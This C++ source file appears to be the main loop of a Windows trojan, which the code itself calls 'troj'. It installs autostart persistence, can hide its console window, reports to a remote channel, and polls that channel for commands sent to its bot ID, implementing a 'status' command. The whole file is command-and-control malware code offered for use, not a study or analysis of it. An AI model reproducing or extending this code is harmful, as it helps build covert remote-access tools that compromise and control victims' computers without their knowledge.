#include <iostream>
#include <string>
#include <fstream>
#include <windows.h>
#include <time.h>
#include <sstream>
#include "troj.hpp"
#include <cpr/cpr.h>
#include <nlohmann/json.hpp>

using namespace std;
using json = nlohmann::json;

constexpr int REFRESH = 1; //in seconds
constexpr bool AUTOSTART = 1; 
constexpr bool HIDE_TERMINAL = 0;

int main() {
	if(AUTOSTART) autostart();
	if(HIDE_TERMINAL) ShowWindow(::GetConsoleWindow(), SW_HIDE);
    uptime_start = time(nullptr);

	fstream file;
	file.open("ID.id");
	file >> ID;
	file.close();

	if (ID.empty()) ID = "X";

	Send(ID + " Is running");

	while (true) {
		Sleep(REFRESH * 1000);
		json message = GetLastMessage();

		int last;
		file.open("last", ios::in);
		file >> last;
		file.close();

		if (last == message["message_id"]) continue;
		if (time(nullptr) - message["date"] > 3) continue;

		last = message["message_id"].get<int>();
		file.open("last", ios::out);
		file << last;
		file.close();

		
		string id="", command="" ,parameters="";
		string parse = message["text"];
		for (int i = 0, it = 0; i < parse.size(); i++)
		{
			if (parse[i] == ' ') {
				it++; continue;
			}

			if (it == 0)id += parse[i];
			if (it == 1)command += parse[i];
			if (it > 1)parameters += parse[i];

		}
		if (id.empty() || command.empty()) continue;
		
		if (ID == id) { //I used json cause propably in developing dupnix i will use it
			if (command == "status") { 
				string s; stringstream ss;
				Send(getStatus());
			}
		}
	}
}
